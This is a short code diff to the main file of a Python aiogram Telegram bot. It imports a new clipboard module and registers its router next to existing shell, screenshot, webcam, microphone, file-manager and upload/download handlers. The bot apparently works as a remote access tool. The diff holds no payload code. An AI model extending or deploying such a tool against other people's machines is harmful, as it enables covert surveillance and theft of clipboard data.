@@ -2,7 +2,7 @@ import asyncio
 import logging
 import os
 from aiogram import Dispatcher, types
-from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic
+from helpers import ip_addr, ps, screenshot, shell, sys_info, up_down, webcam, handlers, file_man, mic, clipboard
 from cfg import bot as bot
 
 # Author : Exited3n
@@ -23,6 +23,7 @@ dp.include_router(ps.router)
 dp.include_router(webcam.router)
 dp.include_router(file_man.router)
 dp.include_router(mic.router)
+dp.include_router(clipboard.router)
 
 
 @dp.errors()
